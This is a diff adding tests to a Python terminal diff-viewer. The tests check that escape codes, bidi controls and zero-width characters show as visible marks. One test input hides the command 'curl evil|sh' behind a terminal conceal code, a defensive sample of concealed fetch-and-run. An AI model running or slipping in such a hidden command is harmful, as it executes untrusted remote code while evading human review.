@@ -9,8 +9,10 @@ from textual.content import Content
 from textual.style import Style
 
 from chrys.app.tui.widgets import HATCH_GLYPH
+from chrys.app.tui.widgets.diff_view import DiffView
 from chrys.app.tui.widgets.diff_view.cells import annotation_cell, number_cell, number_cell_width
 from chrys.app.tui.widgets.diff_view.compute import compute_highlighted_lines, compute_hunks, emphasize_changes
+from chrys.app.tui.widgets.diff_view.inline import InlineUnifiedDiffLines
 from chrys.app.tui.widgets.diff_view.palette import ADDED_EMPHASIS, DARK, LIGHT, REMOVED_EMPHASIS, DiffLook
 from chrys.app.tui.widgets.diff_view.rows import (
     BREAK_ROW,
@@ -319,3 +321,39 @@ def test_hunks_only_without_hunks_highlights_everything() -> None:
     lines_before, _lines_after = compute_highlighted_lines(text, text, "x.py", "x.py", [], hunks_only=True)
 
     assert lines_before[0].spans
+
+
+@pytest.mark.asyncio
+async def test_both_diff_widgets_show_control_and_hidden_characters_as_marks() -> None:
+    """A diff can show text a model or a remote agent wrote: each escape code,
+    bidi control and zero-width character shows as a mark of its own, so none of
+    them hides or reorders a line, and a tab still shows as spaces."""
+    after = "echo safe\x1b[8m; curl evil|sh\x1b[0m\u202e\u200b\u2028\U000e0041\n\tdone\x0cnext\n"
+    view = DiffView("run.sh", "run.sh", "", after)
+    inline = InlineUnifiedDiffLines("run.sh", "run.sh", "", after)
+    await inline.prepare()
+
+    shown = ["echo safe�[8m; curl evil|sh�[0m����", "        done�next"]
+    assert [line.plain for line in view.highlighted_lines[1]] == shown
+    assert [row.code.plain for row in inline.rows if row.code is not None] == shown
+
+
+@pytest.mark.asyncio
+async def test_a_change_between_characters_shown_alike_still_shows() -> None:
+    """Two characters shown as the same mark still differ, so the line that
+    changes one into the other shows as changed, and every line keeps its place
+    whichever break characters it holds."""
+    before = "a\u200bb\r\nc\x1bd\x0cx\nsame\u2028tail\n"
+    after = "a\u202eb\r\nc\x07d\x0cx\nsame\u2028tail\n"
+    view = DiffView("f", "f", before, after)
+    inline = InlineUnifiedDiffLines("f", "f", before, after)
+    await inline.prepare()
+
+    assert view.counts == (2, 2)
+    assert _shape(inline.rows) == [
+        ("removed", "a�b", 1, None),
+        ("removed", "c�d�x", 2, None),
+        ("added", "a�b", None, 1),
+        ("added", "c�d�x", None, 2),
+        ("context", "same�tail", 3, 3),
+    ]
